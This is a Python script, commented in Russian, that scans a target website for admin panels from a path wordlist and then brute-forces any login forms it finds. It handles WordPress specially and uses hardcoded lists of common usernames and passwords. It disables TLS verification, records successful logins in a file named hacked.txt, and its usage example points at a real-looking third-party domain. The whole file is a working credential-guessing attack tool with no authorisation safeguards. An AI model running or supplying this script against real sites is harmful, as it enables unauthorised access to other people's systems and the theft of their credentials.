#!/usr/bin/env python3
"""
Сканер админки + автоматический брутфорс паролей
"""

import requests
import sys
import re
from urllib.parse import urljoin
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# Топ паролей
TOP_PASSWORDS = [
    'admin', 'password', '123456', '12345678', '1234', '12345', 'admin123',
    'root', 'root123', 'toor', 'qwerty', 'abc123', '111111', '123123',
    'admin@123', 'Admin123', 'administrator', 'letmein', 'welcome', 'passw0rd',
    'pass123', 'admin1', 'user', 'test', 'demo', 'secret', 'changeme',
    '123456789', '987654321', '1q2w3e4r', 'zaq12wsx', 'qwerty123', 'adminpass',
    'Admin@123', 'P@ssw0rd', 'password123', 'default', 'guest', 'master'
]

# Топ логинов
TOP_LOGINS = ['admin', 'root', 'administrator', 'user', 'test', 'demo', 'manager', 'webmaster', 'admin1']

class AdminScannerWithBrute:
    def __init__(self, target_url, wordlist_file):
        self.target_url = target_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.session = requests.Session()
        self.fake_size = None
        self.found_panels = []
        
    def calibrate(self):
        """Определяем размер фейковой страницы"""
        print("\n[1] Калибровка...")
        fake_url = urljoin(self.target_url, "/" + str(datetime.now().timestamp()))
        
        try:
            resp = self.session.get(fake_url, verify=False, timeout=10)
            self.fake_size = len(resp.text)
            print(f"    Фейковый размер: {self.fake_size} байт")
            print(f"    Статус: {resp.status_code}")
            return True
        except Exception as e:
            print(f"    Ошибка: {e}")
            return False
    
    def detect_login_form(self, html, url):
        """Определяет форму логина и возвращает данные для брутфорса"""
        result = {
            'has_form': False,
            'login_url': url,
            'username_field': 'username',
            'password_field': 'password',
            'csrf_token': None,
            'is_wordpress': False
        }
        
        # Проверка на WordPress
        if 'wp-content' in html or 'wp-includes' in html or 'wp-login' in url:
            result['is_wordpress'] = True
            result['username_field'] = 'log'
            result['password_field'] = 'pwd'
            result['login_url'] = urljoin(self.target_url, '/wp-login.php')
        
        # Поиск action в форме
        action_match = re.search(r'<form[^>]*action\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            if action:
                result['login_url'] = urljoin(url, action)
        
        # Поиск поля пароля
        password_match = re.search(r'<input[^>]*type\s*=\s*["\']password["\'][^>]*name\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if password_match:
            result['has_form'] = True
            result['password_field'] = password_match.group(1)
        
        # Поиск поля логина
        username_patterns = [
            r'<input[^>]*name\s*=\s*["\'](?:log|user|username|login|email|user_login|user_name)["\']',
            r'<input[^>]*id\s*=\s*["\'](?:user|username|login|email)["\']'
        ]
        
        for pattern in username_patterns:
            user_match = re.search(pattern, html, re.IGNORECASE)
            if user_match:
                result['has_form'] = True
                # Извлекаем имя поля
                name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', user_match.group(0), re.IGNORECASE)
                if name_match:
                    result['username_field'] = name_match.group(1)
                break
        
        # Поиск CSRF токена
        csrf_match = re.search(r'name\s*=\s*["\'](?:csrf|csrf_token|_token|authenticity_token)["\'][^>]*value\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if csrf_match:
            result['csrf_token'] = csrf_match.group(1)
        
        return result
    
    def try_wordpress_login(self, login_url):
        """Специальная проверка для WordPress"""
        print(f"\n   🔐 WordPress detected! Trying common credentials...")
        
        for username in TOP_LOGINS[:5]:
            for password in TOP_PASSWORDS[:20]:
                try:
                    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': self.target_url + '/wp-admin/'}
                    
                    response = self.session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=False)
                    
                    if response.status_code in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'wp-admin' in location and 'login' not in location.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            return {'username': username, 'password': password, 'url': login_url}
                    
                    elif response.status_code == 200:
                        if 'dashboard' in response.text.lower() and 'login' not in response.text.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            return {'username': username, 'password': password, 'url': login_url}
                    
                    print(f"   [-] {username}:{password}", end='\r')
                    
                except Exception as e:
                    continue
        
        return None
    
    def try_generic_login(self, login_url, username_field, password_field, csrf_token):
        """Общая проверка логина"""
        print(f"\n   🔐 Trying credentials on {login_url}")
        print(f"   Fields: {username_field} / {password_field}")
        print("-" * 40)
        
        for username in TOP_LOGINS[:5]:
            for password in TOP_PASSWORDS[:20]:
                try:
                    data = {username_field: username, password_field: password}
                    if csrf_token:
                        data['csrf_token'] = csrf_token
                    
                    response = self.session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=False)
                    
                    # Проверка успеха
                    if response.status_code in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'login' not in location.lower() and 'error' not in location.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            print(f"   Redirect: {location}")
                            return {'username': username, 'password': password, 'url': login_url}
                    
                    elif response.status_code == 200:
                        # Проверяем содержание
                        if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
                            if 'invalid' not in response.text.lower() and 'incorrect' not in response.text.lower():
                                print(f"\n   🏆 УСПЕХ! {username}:{password}")
                                return {'username': username, 'password': password, 'url': login_url}
                    
                    print(f"   [-] {username}:{password}", end='\r')
                    
                except Exception as e:
                    continue
        
        print(f"\n   ✗ Не удалось подобрать пароль")
        return None
    
    def find_real_pages(self):
        """Находит реальные страницы и проверяет логин"""
        print(f"\n[2] Загрузка wordlist: {self.wordlist_file}")
        
        try:
            with open(self.wordlist_file, 'r') as f:
                paths = [line.strip() for line in f if line.strip()]
            print(f"    Загружено {len(paths)} путей")
        except Exception as e:
            print(f"    Ошибка: {e}")
            return []
        
        print(f"\n[3] Сканирование {self.target_url}")
        print("=" * 70)
        
        # Сначала проверим стандартные CMS пути
        print("\n[!] Быстрая проверка стандартных CMS...")
        standard_paths = [
            '/wp-login.php', '/administrator/index.php', '/admin/login.php',
            '/admin/index.php', '/login.php', '/admin', '/administrator'
        ]
        
        for path in standard_paths:
            test_url = urljoin(self.target_url, path)
            try:
                resp = self.session.get(test_url, verify=False, timeout=5)
                if resp.status_code == 200 and len(resp.text) != self.fake_size:
                    self.test_page(test_url, resp.text)
            except:
                pass
        
        # Полное сканирование
        for i, path in enumerate(paths, 1):
            test_url = urljoin(self.target_url + '/', path)
            
            try:
                resp = self.session.get(test_url, verify=False, timeout=5)
                current_size = len(resp.text)
                
                # Если это реальная страница
                if self.fake_size and abs(current_size - self.fake_size) > 200:
                    print(f"\n[+] {test_url}")
                    print(f"    Размер: {current_size} (фейк: {self.fake_size})")
                    
                    # Сохраняем HTML
                    filename = path.replace('/', '_').replace('?', '_') + '.html'
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(resp.text)
                    print(f"    Сохранено: {filename}")
                    
                    # Проверяем форму и пробуем брутфорс
                    self.test_page(test_url, resp.text)
                    
                elif i % 100 == 0:
                    print(f"[*] Прогресс: {i}/{len(paths)}", end='\r')
                    
            except Exception as e:
                continue
        
        print(f"\n\n[4] Сканирование завершено!")
    
    def test_page(self, url, html):
        """Тестирует страницу на наличие формы и пробует брутфорс"""
        form_info = self.detect_login_form(html, url)
        
        if form_info['has_form'] or form_info['is_wordpress']:
            print(f"    🔐 ОБНАРУЖЕНА ФОРМА ВХОДА!")
            
            if form_info['is_wordpress']:
                print(f"    Тип: WordPress")
                result = self.try_wordpress_login(form_info['login_url'])
            else:
                print(f"    Тип: Generic")
                print(f"    Action: {form_info['login_url']}")
                print(f"    Поля: {form_info['username_field']}, {form_info['password_field']}")
                result = self.try_generic_login(
                    form_info['login_url'],
                    form_info['username_field'],
                    form_info['password_field'],
                    form_info['csrf_token']
                )
            
            if result:
                print(f"\n🏆🏆🏆 ВЗЛОМАНО! 🏆🏆🏆")
                print(f"   URL: {result['url']}")
                print(f"   Логин: {result['username']}")
                print(f"   Пароль: {result['password']}")
                print(f"   Сохранено в: hacked.txt")
                
                # Сохраняем результат
                with open('hacked.txt', 'a') as f:
                    f.write(f"{result['url']}|{result['username']}|{result['password']}\n")
        else:
            print(f"    ℹ Формы входа не найдено")
    
    def run(self):
        """Запуск"""
        print("=" * 70)
        print("🔍 ADMIN SCANNER + BRUTE FORCE 🔍")
        print("=" * 70)
        print(f"🎯 Цель: {self.target_url}")
        
        if not self.calibrate():
            print("Ошибка калибровки")
            return
        
        self.find_real_pages()
        
        print("\n" + "=" * 70)
        print("📊 РЕЗУЛЬТАТЫ")
        print("=" * 70)
        
        try:
            with open('hacked.txt', 'r') as f:
                hacked = f.readlines()
                if hacked:
                    print(f"\n✅ ВЗЛОМАННЫЕ ПАНЕЛИ:")
                    for line in hacked:
                        print(f"   {line.strip()}")
                else:
                    print("\n❌ Ничего не взломано")
        except:
            print("\n❌ Ничего не взломано")

def main():
    if len(sys.argv) != 3:
        print("Использование: python3 scan.py <URL> <wordlist>")
        print("Пример: python3 scan.py https://asiaconsult.uz admin_1000top.txt")
        sys.exit(1)
    
    scanner = AdminScannerWithBrute(sys.argv[1], sys.argv[2])
    scanner.run()

if __name__ == "__main__":
    main()
